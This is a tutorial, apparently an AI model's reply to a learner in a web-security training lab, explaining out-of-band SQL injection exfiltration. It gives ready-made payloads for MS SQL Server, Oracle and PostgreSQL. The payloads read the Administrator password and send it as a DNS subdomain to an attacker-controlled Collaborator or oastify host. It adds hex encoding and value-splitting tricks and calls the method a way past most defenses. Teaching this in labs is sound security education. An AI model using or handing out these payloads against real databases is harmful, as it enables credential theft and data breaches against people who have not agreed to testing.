# OOB Data Exfiltration — Explained Simply

## The Core Idea

You've already confirmed the DB can **trigger an outbound DNS request** to your Collaborator domain. Now you make it **carry stolen data in the DNS request itself**.

Instead of asking yes/no questions one at a time, the DB sends you the **actual value** in one shot — like mailing you the answer instead of playing 20 questions.

---

## 🎯 The MS SQL Server Payload

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

### Breaking It Down

| Line | What It Does |
|------|--------------|
| `declare @p varchar(1024)` | Declares a variable `@p` to hold the password |
| `set @p=(SELECT password FROM users WHERE username='Administrator')` | Stores the Admin's password in `@p` |
| `exec('master..xp_dirtree "//'+@p+'.collab.oastify.com/a"')` | Triggers a UNC path access that includes the password **as a subdomain** |
| `--` | Comments out the rest of the query |

### What the DB Does

1. Reads the password: `S3cure`
2. Builds the UNC path: `\\S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net\a`
3. Windows resolves the hostname → **DNS lookup** for:
   ```
   S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
   ```
4. The DNS request reaches your Collaborator

### What You See in Collaborator

```
DNS lookup: S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
                    ↑
              The password!
```

**The password is right there — as the subdomain.** ✅

---

## 🎯 Why This Is So Powerful

| Advantage | Why It Matters |
|-----------|---------------|
| **One request = full value** | No 20-questions game |
| **Fast** | No delay-based extraction (minutes → seconds) |
| **Reliable** | No timing noise, no response differences |
| **Works blind** | Nothing in the HTTP response needed |
| **Bypasses most defenses** | DNS is rarely blocked |

**This is why OAST is often the *preferred* technique, even when boolean or time-based would work.**

---

## 🎯 The Attack Flow

```
1. Confirm OOB works (simple payload → Collaborator hit)
              ↓
2. Build exfil payload:
   - Extract value into a variable
   - Embed value in a domain name
   - Trigger DNS lookup
              ↓
3. Send payload
              ↓
4. Poll Collaborator
              ↓
5. Read the value from the DNS subdomain ✅
```

---

## 🎯 Database-Specific Exfil Payloads

### Microsoft SQL Server
```sql
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.YOUR-COLLAB.oastify.com/a"')--
```

### Oracle
```sql
'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='Administrator')||'.YOUR-COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

### PostgreSQL
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users WHERE username='Administrator')||'.YOUR-COLLAB.oastify.com'--
```

**The idea is the same in every DB:** embed the extracted value as a subdomain, then trigger a lookup.

---

## 🎯 Common Pitfalls

| Problem | Fix |
|---------|-----|
| **Value has special characters** (spaces, `/`, `@`) | Encode with `HEX()` or base64, or use `REPLACE()` to strip them |
| **Value is too long** | Some DNS labels max at 63 chars — split across multiple subdomains |
| **Case sensitivity** | DNS is case-insensitive → if the password has mixed case, you may lose it → use `HEX()` |
| **No Collaborator hit** | Wrong function for the DB, or network blocks DNS |
| **Only prefix arrives** | DNS truncation — split the value |

### Pro Tip: Encode With HEX

To avoid DNS label issues, encode the value:

```sql
set @p=(SELECT master.dbo.fn_varbintohexstr(CONVERT(varbinary, password)) FROM users WHERE username='Administrator');
```

Then decode the hex from the Collaborator hit.

---

## 🎯 The Takeaway

> **OAST exfiltration turns a blind SQLi into a one-shot data theft.**

Instead of extracting the password **character by character** with time delays (slow, noisy, ~100s of requests), OAST extracts **the entire value in a single request** — and delivers it right to your Collaborator log.

**The pattern:**

1. **Extract** the value into a variable
2. **Embed** it in a domain name
3. **Trigger** an outbound DNS query
4. **Read** the value from the subdomain

**Every character you'd otherwise spend 7+ requests to discover — OAST delivers all of them at once.**

---

Ready to walk through the lab, or move on to the next topic?